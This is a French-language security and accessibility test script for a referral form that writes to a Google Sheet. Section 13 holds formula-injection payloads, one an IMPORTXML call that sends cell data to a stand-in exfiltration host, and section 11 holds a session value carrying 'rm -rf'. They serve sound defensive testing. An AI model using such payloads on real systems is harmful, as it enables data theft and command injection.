  try { c = JSON.parse(posts.slice(avant)[0] || "{}"); } catch (e) {}
  dire("le nom part intact", c.entreprise_referee, P.entreprise);
  dire("le RTL et les émojis partent intacts", c.presentation, P.presentation);
  dire("aucune cellule du classeur n'est devenue un calcul", cellulesCalculees(), 0);
  dire("le texte tordu est bien arrivé au classeur",
    valeur(2, "Comment se présenter"), P.presentation);
  dire("« +41255 » est rangé, pas refusé", valeur(2, "RÉFÉRENT · entreprise"), P.societe);
  dire("aucune boîte de dialogue, même après l'envoi", dialogues.length, 0, dialogues.join(" | "));
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 3).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   7 · LA SAUVEGARDE PROGRESSIVE — LE CAS QUI COMPTE LE PLUS

   Une ligne par PERSONNE, jamais une par étape ni une par visite.
   Deux mises en scène : la modale qu'on ferme et qu'on rouvre, et
   l'onglet qu'on RECHARGE — c'est celle-là qui tue, parce qu'elle
   ne survit que par `localStorage`.
   ------------------------------------------------------------ */
titre("7a · ÉCRAN 1, ON FERME LA MODALE, ON ROUVRE, ON FINIT");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir();
  await ouvrirRefer(page);
  await poser(page, JEU[1]);
  await cliquer(page, "#referNext");
  await page.waitForTimeout(800);
  dire("l'écran 1 a ouvert une ligne", nbLignes(), 1);
  dire("un identifiant de session est posé",
    !!(await page.evaluate(() => localStorage.getItem("aped-sid-refer"))), true);

  await fermerRefer(page);
  dire("la modale est bien fermée",
    await page.evaluate(() => document.getElementById("modal-refer").hidden), true);
  await ouvrirRefer(page);
  const t = await traverser(page, await ecran(page), 7);
  if (t.bloque) arret("7a : bloqué à l'écran " + t.ecran + " après réouverture.");
  await poser(page, { rfAccept: true });
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1600);

  dire("l'écran de succès paraît", await ecran(page), 8);
  dire("UNE SEULE LIGNE AU CLASSEUR", nbLignes(), 1,
    "deux lignes pour un visiteur = un lead compté deux fois et rappelé deux fois");
  dire("la session est oubliée après le succès",
    await page.evaluate(() => localStorage.getItem("aped-sid-refer")), null,
    "sinon le visiteur suivant sur le même appareil écraserait cette ligne-là");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

titre("7b · ÉCRAN 1, ON RECHARGE L'ONGLET, ON REVIENT, ON FINIT");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir();
  await ouvrirRefer(page);
  await poser(page, { rfCompany: "ZZ Boulangerie du coin" });
  await cliquer(page, "#referNext");
  await page.waitForTimeout(800);
  dire("l'écran 1 a ouvert une ligne", nbLignes(), 1);
  const sid1 = await page.evaluate(() => localStorage.getItem("aped-sid-refer"));

  await page.reload({ waitUntil: "load" });
  await pret(page);
  dire("l'identifiant survit au rechargement",
    await page.evaluate(() => localStorage.getItem("aped-sid-refer")), sid1,
    "c'est tout son intérêt : il vit dans `localStorage`, pas en mémoire");

  await ouvrirRefer(page);
  note("après rechargement, `rfCompany` vaut « "
    + await page.evaluate(() => document.getElementById("rfCompany").value)
    + " » — la reprise des RÉPONSES passe par le lien du courriel, pas par la réouverture (D-770)");

  const t = await traverser(page, await ecran(page), 7, { 1: { rfCompany: "ZZ Boulangerie du coin" } });
  if (t.bloque) arret("7b : bloqué à l'écran " + t.ecran + " après rechargement.");
  await poser(page, { rfAccept: true });
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1600);

  dire("l'écran de succès paraît", await ecran(page), 8);
  dire("UNE SEULE LIGNE AU CLASSEUR", nbLignes(), 1,
    "entreprises présentes : " + JSON.stringify(feuilleRefer().valeurs.slice(1)
      .filter((r) => r.some((x) => x !== "" && x != null))
      .map((r) => r[colonne("Entreprise référée")])));
  dire("l'entreprise est la bonne", valeur(2, "Entreprise référée"), "ZZ Boulangerie du coin");
  dire("l'acceptation est posée", valeur(2, "Conditions acceptées"), "oui");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   7c · CE QUE LE FORMULAIRE POSTE AVANT QU'ON AIT ACCEPTÉ

   `serialize()` sérialise TOUT le formulaire à chaque étape, y
   compris le champ caché `conditions_version`, en place dès le
   chargement. La colonne « Version acceptée » est FIGÉE : elle
   accepte sa PREMIÈRE valeur et ne la rend jamais.
   ------------------------------------------------------------ */
titre("7c · LES TROIS COLONNES DE PREUVE, AVANT TOUTE ACCEPTATION");
{
  remise();
  const { ctx, page, posts } = await ouvrir();
  await ouvrirRefer(page);
  await poser(page, JEU[1]);
  await cliquer(page, "#referNext");
  await page.waitForTimeout(900);

  let c = {};
  try { c = JSON.parse(posts[0] || "{}"); } catch (e) {}
  note("l'envoi de l'étape 1 porte : " + JSON.stringify(Object.keys(c).filter((k) => k.indexOf("condition") === 0)));

  dire("« Conditions acceptées » est vide", valeur(2, "Conditions acceptées"), "");
  dire("« Acceptées le » est vide", valeur(2, "Acceptées le"), "");
  dire("« Version acceptée » est vide AUSSI", valeur(2, "Version acceptée"), "",
    "la colonne est FIGÉE : la version posée ici ne pourra plus jamais être corrigée. "
    + "Une personne qui revient finir après une révision des conditions verra le classeur "
    + "affirmer qu'elle a accepté un texte qu'elle n'a jamais vu.");
  await ctx.close();
}

titre("7d · LA CASE COCHÉE PUIS UN RETOUR EN ARRIÈRE — la preuve se pose-t-elle sans envoi ?");
{
  remise();
  const { ctx, page, posts } = await ouvrir();
  await ouvrirRefer(page);
  const t = await traverser(page, 1, 7);
  if (t.bloque) arret("7d : bloqué à l'écran " + t.ecran + ".");
  await poser(page, { rfAccept: true });
  /* On coche, puis on revient sur ses pas — geste banal : relire
     ce qu'on a écrit avant d'envoyer. L'enregistrement discret de
     l'écran 6 repart alors avec `conditions_acceptees: "oui"`, mais
     SANS `_final`. Le visiteur, lui, n'a rien envoyé. */
  await cliquer(page, "#referBack");
  dire("on est bien revenu à l'écran 6", await ecran(page), 6);
  const avant = posts.length;
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1000);
  note("requêtes parties par ce simple aller-retour : " + (posts.length - avant));

  const acc = valeur(2, "Conditions acceptées");
  const le = valeur(2, "Acceptées le");
  dire("aucune étape intermédiaire ne pose « Conditions acceptées »", acc, "",
    "lu : « " + acc + " » — la ligne dirait « accepté » d'une référence jamais envoyée, "
    + "et la colonne est FIGÉE : plus personne ne pourra la corriger");
  dire("… et si elle est posée, elle porte au moins une heure",
    acc === "" ? "s/o" : (le.length > 0 ? "s/o" : "SANS HEURE"), "s/o",
    "« oui » sans date et sans envoi n'est pas une preuve, c'est un bruit dans la colonne");
  await ctx.close();
}

/* ------------------------------------------------------------
   8 · LES CIBLES AU POUCE, EN 390 px

   MESURÉES, PAS DÉDUITES. `getBoundingClientRect` sur chaque
   élément, écran par écran — un `data-rstep` masqué mesure zéro,
   donc il faut le rendre visible pour le voir. Et la section est
   amenée à l'écran AVANT la mesure : `content-visibility: auto`
   rend la taille RÉSERVÉE, pas la vraie. (pièges 4 · 34)

   LES LIENS EN LIGNE DANS UN PARAGRAPHE SONT COMPTÉS À PART. Un
   lien au milieu d'une phrase suit la hauteur de sa ligne de
   texte : l'exiger à 44 px reviendrait à exiger un corps de 44 px.
   WCAG 2.5.8 les exempte nommément. On les mesure, on les affiche,
   on ne les compte pas comme des défauts.
   ------------------------------------------------------------ */
titre("8 · TOUTES LES CIBLES DU FORMULAIRE ET DE LA SECTION, EN 390 × 844");
{
  remise();
  const { ctx, page } = await ouvrir({ largeur: 390, hauteur: 844 });
  note("data-palier : " + await palier(page));

  const MESURE = (portee) => {
    const out = [];
    /* LA PORTÉE SE PRÉFIXE SUR CHAQUE SÉLECTEUR, PAS SUR LA LISTE.
       « #reference button, select, a » ne veut PAS dire « les
       boutons, listes et liens de #reference » : seul le premier
       porte la portée, les autres ratissent la page entière.
       Première passe de cet outil : 22 « cibles trop petites »,
       dont le lien d'évitement, le mot-marque et huit cases du
       calculateur — aucune dans la section visée. */
    const sel = ["button", "select", "textarea", "input:not([type=hidden])",
      "a[href]", "[role=button]", "summary"].map((s) => portee + " " + s).join(",");
    const vus = new Set();
    document.querySelectorAll(sel).forEach((el) => {
      if (el.closest(".piege")) return;         /* un piège à robots n'a pas à être confortable au pouce */

      /* LA CIBLE D'UNE CASE À COCHER, C'EST SON ÉTIQUETTE. Un
         `<input type=checkbox>` fait 16 px partout dans le monde ;
         ce qu'on TOUCHE, c'est le `<label for>` qui l'enveloppe, et
         c'est lui que WCAG 2.5.8 mesure. Accuser l'input serait
         accuser un défaut qui n'existe pas — et détourner
         l'attention de ceux qui existent. */
      let cible = el;
      let via = "";
      if (el.tagName === "INPUT" && (el.type === "checkbox" || el.type === "radio")) {
        const lab = el.closest("label")
          || (el.id ? document.querySelector('label[for="' + el.id.replace(/"/g, '\\"') + '"]') : null);
        if (lab) { cible = lab; via = " (par son étiquette)"; }
      }
      const r = cible.getBoundingClientRect();
      if (r.width < 1 || r.height < 1) return;  /* masqué : hors sujet */

      const p = el.parentElement;
      const enLigne = el.tagName === "A" && p
        && ["P", "LI", "SPAN", "TD", "EM", "STRONG", "SMALL", "B"].indexOf(p.tagName) !== -1;
      const quoi = String(el.id || el.getAttribute("name") || el.className || el.tagName).slice(0, 46) + via;
      const cle = quoi + "|" + Math.round(r.width) + "|" + Math.round(r.height);
      if (vus.has(cle)) return;
      vus.add(cle);
      out.push({
        quoi: quoi,
        l: Math.round(r.width * 10) / 10,
        h: Math.round(r.height * 10) / 10,
        enLigne: enLigne
      });
    });
    return out;
  };

  /* --- la section, PANNEAU FERMÉ PUIS OUVERT ---
     Le panneau des montants est `hidden` au chargement (D-773) : ses
     cibles mesurent zéro tant qu'on ne l'ouvre pas. Les mesurer
     fermé puis ouvert est le seul moyen de toutes les voir. */
  await page.evaluate(() => {
    const s = document.getElementById("reference");
    if (s) s.scrollIntoView({ block: "center", behavior: "instant" });
  });
  await page.waitForTimeout(800);
  const section = await page.evaluate(MESURE, "#reference");
  await cliquer(page, "#refVoir");
  await page.waitForTimeout(500);
  const ouvert = await page.evaluate(MESURE, "#reference");
  ouvert.forEach((x) => section.push(x));

  /* ZÉRO RÉSULTAT DOIT ARRÊTER L'OUTIL, ET « PRESQUE ZÉRO » AUSSI.
     La première passe rendait 50 cibles ici — toutes hors de la
     section, par une portée mal appliquée. Puis 2. Le vrai compte
     tient entre les deux, et un seuil trop bas laisserait passer
     une section qui n'a pas été peinte. */
  if (section.length < 3) {
    arret("seulement " + section.length + " cible(s) mesurée(s) dans `#reference` — "
      + "la section n'était probablement pas peinte : `content-visibility: auto` rend "
      + "la taille RÉSERVÉE, pas la vraie (pièges 4 · 34).");
  }
  note("cibles mesurées dans #reference (panneau fermé puis ouvert) : " + section.length);

  /* --- la modale, ses sept écrans, tiroir des conditions ouvert --- */
  await ouvrirRefer(page);
  const modale = [];
  for (let e = 1; e <= 7; e++) {
    await page.evaluate((k) => {
      document.querySelectorAll('#modal-refer .step[data-rstep]').forEach((s) => {
        s.hidden = Number(s.dataset.rstep) !== k;
      });
    }, e);
    await page.waitForTimeout(180);
    if (e === 7) await cliquer(page, "#rfCondVoir");
    (await page.evaluate(MESURE, "#modal-refer")).forEach((x) => modale.push(x));
  }
  if (!modale.length) arret("aucune cible mesurée dans `#modal-refer`.");

  /* LA BARRE DE NAVIGATION EST MESURÉE SEPT FOIS — une par écran.
     On dédoublonne sur « quoi + taille », sinon un même bouton trop
     petit paraîtrait sept défauts et un seul bouton corrigé en
     effacerait sept. */
  const vus = new Set();
  const tout = section.concat(modale).filter((x) => {
    const cle = x.quoi + "|" + x.l + "|" + x.h;
    if (vus.has(cle)) return false;
    vus.add(cle); return true;
  });
  note("cibles distinctes mesurées : " + tout.length);

  const petits = tout.filter((x) => !x.enLigne && (x.h < 44 || x.l < 44));
  const enLigne = tout.filter((x) => x.enLigne && (x.h < 44 || x.l < 44));

  dire("aucune cible sous 44 × 44 px", petits.length, 0,
    petits.map((x) => x.quoi + "  " + x.l + " × " + x.h).join("\n         · "));
  note("liens en ligne dans un paragraphe sous 44 px (exemptés WCAG 2.5.8) : "
    + (enLigne.length ? enLigne.map((x) => x.quoi + " " + x.l + "×" + x.h).join(" · ") : "aucun"));

  /* CHAQUE ARRÊT AU CLAVIER A SON ANNEAU — seuil de `CLAUDE.md`. */
  const sansAnneau = await page.evaluate(() => {
    const out = [];
    [...document.querySelectorAll("#modal-refer button, #modal-refer select, "
      + "#modal-refer input:not([type=hidden]), #modal-refer textarea, #modal-refer a[href]")]
      .filter((el) => el.offsetParent !== null && el.tabIndex >= 0 && !el.closest(".piege"))
      .forEach((el) => {
        el.focus();
        const s = getComputedStyle(el);
        const large = parseFloat(s.outlineWidth) > 0 && s.outlineStyle !== "none";
        const ombre = s.boxShadow && s.boxShadow !== "none";
        if (!large && !ombre) out.push(el.id || el.className || el.tagName);
      });
    return out;
  });
  dire("chaque arrêt au clavier a un anneau visible", sansAnneau.length, 0, sansAnneau.join(" · "));
  await ctx.close();
}

/* ============================================================
   PARTIE II — PAR REQUÊTE FORGÉE

   Celui qui fabrique une requête ne voit jamais le formulaire : ni
   la case, ni les sept écrans, ni le champ piège. Tout ce que le
   navigateur garantit est ici remis à zéro.
   ============================================================ */
console.log("");
console.log("############################################################");
console.log("PARTIE II · PAR REQUÊTE FORGÉE (aucun navigateur)");
console.log("############################################################");

titre("9 · RAPPEL D'ACCEPTATION — le détail est dans `acceptation-check.mjs`");
{
  remise();
  const ok = await forge(reference("rapOk"));
  dire("TÉMOIN · le jeu complet, avec acceptation, PASSE", ok.success, true, ok.message || "");

  remise();
  const sans = await forge(reference("rapSans", { conditions_acceptees: undefined }));
  dire("sans la case : refusé", sans.success, false, sans.message);
  dire("… et rien n'est écrit", nbLignes(), 0);

  remise();
  const non = await forge(reference("rapNon", { conditions_acceptees: "non" }));
  dire("« non » : refusé", non.success, false, non.message);

  remise();
  const faux = await forge(reference("rapFaux", { conditions_version: "2099-12-31" }));
  dire("version inventée : refusée", faux.success, false, faux.message);
}

titre("10 · LE FORMULAIRE QU'ON NE CONNAÎT PAS");
{
  remise();
  const inconnu = await forge(reference("frmX", { _form: "referral" }));
  dire("`_form` inconnu : refusé", inconnu.success, false, inconnu.message);
  dire("il dit quoi", /formulaire inconnu/i.test(String(inconnu.message)), true, inconnu.message);

  const absent = await forge(Object.assign(reference("frmY"), { _form: undefined }));
  dire("`_form` absent : refusé", absent.success, false, absent.message);

  const vide = await forge(reference("frmZ", { _form: "" }));
  dire("`_form` vide : refusé", vide.success, false, vide.message);

  const casse = await forge(reference("frmC", { _form: "REFER" }));
  dire("`_form` en majuscules : refusé", casse.success, false, casse.message);

  /* `SCHEMA[kind]` est cherché sur un objet littéral : sans garde,
     « constructor » ou « toString » y répondraient quelque chose. */
  const proto = await forge(reference("frmP", { _form: "constructor" }));
  dire("`_form` = « constructor » : refusé", proto.success, false, proto.message);
  const proto2 = await forge(reference("frmQ", { _form: "toString" }));
  dire("`_form` = « toString » : refusé", proto2.success, false, proto2.message);

  dire("aucune ligne n'est née de tout ça", nbLignes(), 0);

  remise();
  const bon = await forge(reference("frmOk"));
  dire("TÉMOIN · `_form: \"refer\"` passe", bon.success, true, bon.message || "");
}

titre("11 · L'IDENTIFIANT DE SESSION MALFORMÉ");
{
  remise();
  const court = await forge(reference("x", { _sid: "abc" }));
  dire("`_sid` de 3 signes : refusé", court.success, false, court.message);

  const sale = await forge(reference("x", { _sid: "abc/def;rm -rf/" }));
  dire("`_sid` avec des signes interdits : refusé", sale.success, false, sale.message);

  const gros = await forge(reference("x", { _sid: "a".repeat(40000) }));
  dire("`_sid` de 40 000 signes : refusé", gros.success, false, gros.message);
  dire("… et il n'a JAMAIS servi de clé de cache",
    Object.keys(etat.cache).some((k) => k.length > 200), false,
    "un `_sid` non validé finirait dans `CacheService` avant d'être jugé");

  const injecte = await forge(reference("x", { _sid: "=1+1abcdefgh" }));
  dire("`_sid` qui commence par « = » : refusé", injecte.success, false, injecte.message);

  const espaces = await forge(reference("x", { _sid: "  abcdefghij  " }));
  dire("`_sid` entouré d'espaces : refusé", espaces.success, false, espaces.message);

  dire("aucune ligne n'est née", nbLignes(), 0);

  const bon = await forge(reference("sidOk24"));
  dire("TÉMOIN · un `_sid` de 24 signes passe", bon.success, true, bon.message || "");
  dire("… et il ouvre bien une ligne", nbLignes(), 1);
}

titre("12 · LES CHAMPS INCONNUS N'ATTEIGNENT PAS LES COLONNES DE SUIVI");
{
  remise();
  const INTRUS = {
    "Statut": "Terminé", "Notes internes": "payé, ne pas rappeler",
    "Signature": "S:falsifiee", "Relance": "2026-01-01", "Renvois": "99",
    "Vu": "TRUE", "Lu par": "Personne", "Rappelé par": "Personne",
    "Étape": "✓ complet", "Horodatage": "1999-01-01", "Parti vers": "Réservation",
    "_conditions_le": "1990-01-01 00:00:00",
    statut: "Terminé", notes_internes: "x", signature: "y", relance: "z"
  };
  const r = await forge(reference("intrus", INTRUS));
  dire("l'envoi passe — on n'attaque pas la validité", r.success, true, r.message || "");
  dire("une ligne existe", nbLignes(), 1);

  dire("« Statut » n'est pas « Terminé »", valeur(2, "Statut") === "Terminé", false,
    "lu : « " + valeur(2, "Statut") + " »");
  dire("« Notes internes » reste vide", valeur(2, "Notes internes"), "");
  dire("« Relance » reste vide", valeur(2, "Relance"), "");
  dire("« Renvois » n'est pas 99", valeur(2, "Renvois") === "99", false, "lu : " + valeur(2, "Renvois"));
  dire("« Lu par » reste vide", valeur(2, "Lu par"), "");
  dire("« Rappelé par » reste vide", valeur(2, "Rappelé par"), "");
  dire("« Signature » n'est pas celle qu'on a fournie",
    valeur(2, "Signature") === "S:falsifiee", false, "lue : " + valeur(2, "Signature"));
  dire("« Parti vers » n'est pas dicté par un champ inconnu",
    valeur(2, "Parti vers") === "Réservation", false, "lu : " + valeur(2, "Parti vers"));
  dire("« Acceptées le » est l'heure du SERVEUR, pas 1990",
    valeur(2, "Acceptées le").indexOf("1990"), -1, "lu : " + valeur(2, "Acceptées le"));
  dire("« Horodatage » n'est pas 1999",
    String(valeur(2, "Horodatage")).indexOf("1999"), -1, "lu : " + valeur(2, "Horodatage"));

  /* TÉMOIN POSITIF. Sans lui, « rien n'a atteint les colonnes »
     pourrait simplement vouloir dire que rien n'a été écrit. */
  dire("TÉMOIN · un champ connu atteint sa colonne",
    valeur(2, "Entreprise référée"), "ZZ Garage Tremblay");
  dire("TÉMOIN · et un second aussi", valeur(2, "RÉFÉRENT · nom"), "ZZ Referent");
}

titre("13 · UNE VALEUR QUI COMMENCE PAR « = », « + », « - » OU « @ »");
{
  /* LE BANC DOIT D'ABORD PROUVER QU'IL SAIT VOIR UNE FORMULE.
     Un `getFormulas()` qui rend toujours vide ferait passer
     n'importe quel poison pour du texte inerte — c'est exactement
     la panne qui a laissé croire pendant des mois que D-757 tenait.
     On en écrit une VRAIE, par une vraie plage, et on la relit. */
  remise();
  {
    const f = services.SpreadsheetApp.openById("X").getSheetByName(ONGLET);
    f.getRange(3, 1, 1, 1).setValues([["=1+1"]]);
    const vue = f.getRange(3, 1, 1, 1).getFormulas()[0][0];
    dire("TÉMOIN D'INSTRUMENT · le banc VOIT une vraie formule", vue, "=1+1");
    if (vue !== "=1+1") arret("`getFormulas()` du banc ne voit pas une formule qu'on vient d'écrire.");
  }

  remise();
  const POISONS = {
    entreprise_referee: '=IMPORTXML("https://exfil.example/?"&A2,"//a")',
    domaine: "+41255",
    besoin: "-cmd",
    taille: "@import",
    votre_entreprise: '=HYPERLINK("https://x","clic")',
    presentation: "=1+1",
    contexte: "@SUM(A1:A9)"
  };
  const r = await forge(reference("poison", POISONS));
  dire("l'envoi passe — on ne refuse pas le client", r.success, true, r.message || "");
  dire("AUCUNE cellule n'est un calcul", cellulesCalculees(), 0,
    "cellules : " + [...feuilleRefer().formules].join(", "));

  /* LE TEXTE EST RANGÉ, PAS MUTILÉ. Sheets mange l'apostrophe de
     tête à l'enregistrement : la valeur relue doit être la chaîne
     d'ORIGINE. Une valeur amputée de son « = » prouverait qu'on a
     abîmé la réponse du visiteur au lieu de la ranger. */
  dire("le nom d'entreprise est intact", valeur(2, "Entreprise référée"), POISONS.entreprise_referee);
  dire("« +41255 » est intact", valeur(2, "Domaine"), "+41255");
  dire("« -cmd » est intact", valeur(2, "Besoin pressenti"), "-cmd");
  dire("« @import » est intact", valeur(2, "Taille"), "@import");
  dire("« =1+1 » est intact", valeur(2, "Comment se présenter"), "=1+1");
  dire("« @SUM(A1:A9) » est intact", valeur(2, "Contexte"), "@SUM(A1:A9)");

  /* LA SECONDE ÉCRITURE NE DOIT PAS RALLUMER LE POISON.
     `getValues()` rend la forme NUE : une étape suivante qui touche
     n'importe quel AUTRE champ réécrit la ligne entière, et Sheets
     recalcule ce qu'il relit. (D-761)

     LE POISON EST RENVOYÉ, ET IL FAUT L'EXPLIQUER : `requisPartiel`
     exige `entreprise_referee` non vide sur toute étape en session,
     donc on ne PEUT pas l'omettre. Il n'entre pas dans `touchees`
     — `fusionnerLigne` compare avant d'écrire — et ce qui est
     éprouvé reste bien la réécriture de la ligne entière. */
  const r2 = await forge({
    _form: "refer", _sid: sidDe("poison"), _etape: 4, _etapes: 8,
    entreprise_referee: POISONS.entreprise_referee,
    votre_nom: "ZZ Referent corrigé"
  });
  dire("une seconde étape passe", r2.success, true, r2.message || "");
  dire("… et elle a bien touché la ligne", valeur(2, "RÉFÉRENT · nom"), "ZZ Referent corrigé",
    "sans modification, `fusionnerLigne` ne réécrit rien et le cas ne prouverait rien");
  dire("APRÈS FUSION, toujours aucun calcul", cellulesCalculees(), 0,
    "cellules rallumées : " + [...feuilleRefer().formules].join(", "));
  dire("et le poison est toujours lisible tel quel",
    valeur(2, "Entreprise référée"), POISONS.entreprise_referee);
  dire("une seule ligne, toujours", nbLignes(), 1);
}

titre("14 · CINQUANTE ENVOIS D'AFFILÉE");
{
  remise();
  const SID = sidDe("debit50");
  let passes = 0, refuses = 0, muets = 0;
  const messages = new Set();
  for (let i = 0; i < 50; i++) {
    const r = await forge({
      _form: "refer", _sid: SID, _etape: 1, _etapes: 8,
      entreprise_referee: "ZZ Débit " + i
    });
    if (r.success) passes++;
    else {
      refuses++;
      messages.add(String(r.message));
      if (!r.message) muets++;
    }
  }
  dire("le plafond a mordu", refuses > 0, true, passes + " passés, " + refuses + " refusés sur 50");
  dire("il mord au plafond déclaré", passes, gs.REGLAGES.DEBIT_SESSION_MAX,
    "REGLAGES.DEBIT_SESSION_MAX = " + gs.REGLAGES.DEBIT_SESSION_MAX);
  dire("ET IL LE DIT", [...messages].every((m) => m && m !== "undefined"), true, [...messages].join(" | "));
  dire("le message n'accuse pas le visiteur",
    /trop d.envois/i.test([...messages][0] || ""), true, [...messages][0]);
  dire("aucun refus muet", muets, 0);
  dire("une seule ligne malgré les passages", nbLignes(), 1,
    "même `_sid` = même ligne, c'est tout l'objet de D-744");

  /* TÉMOIN : un AUTRE visiteur n'est pas puni pour celui-là. */
  const autre = await forge({
    _form: "refer", _sid: sidDe("debitAutre"), _etape: 1, _etapes: 8,
    entreprise_referee: "ZZ Voisin"
  });
  dire("TÉMOIN · un autre `_sid` passe encore", autre.success, true, autre.message || "");
  dire("… et il a sa propre ligne", nbLignes(), 2);
  note("plafond DUR de lignes : " + gs.REGLAGES.DEBIT_LIGNES_MAX
    + " par " + gs.REGLAGES.DEBIT_LIGNES_FENETRE_S + " s — non atteint ici");
}

titre("15 · AUCUN PRIX DANS UNE RÉPONSE DU SERVICE");
{
  for (const q of ["", "?action=diag", "?action=creneaux"]) {
    try {
      const r = await fetch("http://127.0.0.1:" + PORT_G + "/exec" + q);
      REPONSES.push({ ou: "GET " + (q || "/"), corps: await r.text() });
    } catch (e) { arret("la porte GET « " + q + " » n'a pas répondu : " + e.message); }
  }
  if (REPONSES.length < 20) {
    arret("seulement " + REPONSES.length + " réponses collectées — "
      + "l'outil n'a pas assez regardé pour conclure « aucun prix ».");
  }
  note("réponses examinées : " + REPONSES.length);

  /* UN ENTIER NU N'EST PAS UN PRIX, ET LA PREMIÈRE VERSION DE CE
     CONTRÔLE LE CROYAIT. Elle cherchait « 150 », « 250 », « 400 »…
     en toutes lettres, et accusait `?action=diag` — dont les
     nombres sont les LARGEURS DE COLONNES du classeur. Deux faux
     verdicts rendus par un instrument qui n'avait rien vu du tout.

     UN PRIX SE RECONNAÎT À SA MARQUE : un signe de dollar collé au
     nombre, ou un mot d'argent juste à côté. C'est ça qu'on cherche. */
  const MONTANTS = "(150|250|400|600|1[\\s\\u00a0]?200|2[\\s\\u00a0]?500|5[\\s\\u00a0]?000)";
  const DOLLAR = /[0-9][\s ]*\$|\$[\s ]*[0-9]/;
  const fautes = [];
  REPONSES.forEach((r) => {
    const c = String(r.corps || "");
    if (DOLLAR.test(c)) fautes.push(r.ou + " · un nombre collé à un signe de dollar : " + c.slice(0, 150));
    if (new RegExp("(prime|commission|montant|tarif|prix|bar[eè]me)[^0-9]{0,40}" + MONTANTS, "i").test(c)) {
      fautes.push(r.ou + " · un mot d'argent suivi d'un montant de la grille : " + c.slice(0, 150));
    }
  });
  dire("aucun prix dans une réponse du service", fautes.length, 0,
    fautes.slice(0, 4).join("\n         · "));

  /* TÉMOIN D'INSTRUMENT. Un détecteur qui ne trouve jamais rien doit
     prouver qu'il sait trouver — et qu'il ne se trompe pas de proie. */
  dire("TÉMOIN D'INSTRUMENT · le détecteur VOIT un vrai prix",
    DOLLAR.test('{"message":"Votre prime est de 1 200 $."}'), true);
  dire("TÉMOIN D'INSTRUMENT · et il ne prend pas une largeur de colonne pour un prix",
    DOLLAR.test('{"largeurs":[50,110,150,250,400]}'), false);

  const avecMontant = etat.courriels.filter((c) =>
    /\d[\s ]*\$/.test(String(c.corps || "") + String(c.sujet || "")));
  note("courriels produits pendant la dernière passe : " + etat.courriels.length
    + " · portant un montant : " + avecMontant.length);
}

/* ============================================================
   PARTIE III — LE DÉSARMEMENT

   « UN TEST PEUT VERROUILLER LE DÉFAUT. » Un cas qui passe ne
   prouve rien tant qu'on n'a pas montré qu'il TOMBE quand la
   protection disparaît.
   ============================================================ */
console.log("");
console.log("############################################################");
console.log("PARTIE III · CE QUI TOMBE QUAND ON DÉSARME");
console.log("############################################################");

titre("D1 · GARDE DU NAVIGATEUR — la case obligatoire retirée de `validate()`");
{
  remise();
  const { ctx, page, posts } = await ouvrir({
    desarmer: (s) => s.replace(
      `var checks = $$('input[type="checkbox"]', field);`,
      `var checks = []; /* DESARME par tools/reference-attaque.mjs */`)
  });
  await ouvrirRefer(page);
  const t = await traverser(page, 1, 7);
  if (t.bloque) arret("D1 : bloqué à l'écran " + t.ecran + " avec la garde désarmée.");
  const avant = posts.length;
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1800);

  dire("DÉSARMÉ · la requête part maintenant", posts.length - avant, 1,
    "si elle ne part toujours pas, c'est que le cas 1 ne testait pas cette garde-là");
  dire("DÉSARMÉ · mais le SERVEUR la refuse", await ecran(page), 7);
  const msg = await statut(page);
  dire("DÉSARMÉ · et il dit pourquoi", /accepter les conditions/i.test(msg), true, "« " + msg + " »");
  dire("DÉSARMÉ · « Conditions acceptées » reste vide", valeur(2, "Conditions acceptées"), "");
  await ctx.close();
}

titre("D2 · LA SESSION — `localStorage` retiré de `sessionDe()` (le cas 7, désarmé)");
{
  remise();
  const { ctx, page } = await ouvrir({
    desarmer: (s) => s.replace(
      `try { v = localStorage.getItem(cle); } catch (e) {}`,
      `/* DESARME par tools/reference-attaque.mjs */`)
  });
  await ouvrirRefer(page);
  await poser(page, { rfCompany: "ZZ Désarmé" });
  await cliquer(page, "#referNext");
  await page.waitForTimeout(800);
  const t = await traverser(page, 2, 7);
  if (t.bloque) arret("D2 : bloqué à l'écran " + t.ecran + ".");
  await poser(page, { rfAccept: true });
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1800);

  dire("DÉSARMÉ · le classeur porte PLUSIEURS lignes", nbLignes() > 1, true,
    "lignes : " + nbLignes() + " — si c'était encore 1, le cas 7 passerait sans la session "
    + "et ne prouverait rien du tout");
  await ctx.close();
}

titre("D3 · GARDE DU SERVEUR — le bloc d'acceptation retiré de `google/Code.gs`");
{
  const CHEMIN = path.join(RACINE, "google", "Code.gs");
  let propre = true;
  try { execFileSync("git", ["diff", "--quiet", "--", "google/Code.gs"], { cwd: RACINE }); }
  catch (e) { propre = false; }

  if (!propre) {
    console.log("  PASSÉ · `google/Code.gs` porte déjà des modifications non validées ;");
    console.log("          l'outil refuse d'y écrire. Validez ou remisez, puis relancez.");
  } else {
    const original = fs.readFileSync(CHEMIN);
    const empreinte = crypto.createHash("sha256").update(original).digest("hex");
    try {
      /* L'ANCRE TIENT SUR UNE SEULE LIGNE, ET CE N'EST PAS UN
         DÉTAIL : sur un fichier CRLF une ancre à cheval sur deux
         lignes ne matche jamais, l'outil rend « rien changé » et
         personne ne le voit. (piège 86) */
      const UNE = `if (kind === "refer" && data && data._final) {`;
      const texte = original.toString("utf8");
      if (texte.indexOf(UNE) === -1) arret("l'ancre du bloc d'acceptation a bougé dans `Code.gs`.");
      fs.writeFileSync(CHEMIN,
        texte.replace(UNE, `if (false && kind === "refer" && data && data._final) {`), "utf8");

      /* Une chaîne de requête différente force Node à réévaluer le
         module — donc à relire `Code.gs` depuis le disque. */
      const mod = await import(fauxUrl + "?desarme=" + Date.now());
      mod.gs.initialiser();
      const sortie = mod.gs.doPost({ postData: { contents: JSON.stringify({
        _form: "refer", _sid: sidDe("desarmeSrv"), _etape: 7, _etapes: 8, _final: true,
        entreprise_referee: "ZZ Sans Case", contact_reference: "Marie Lavoie, 418 555 0142",
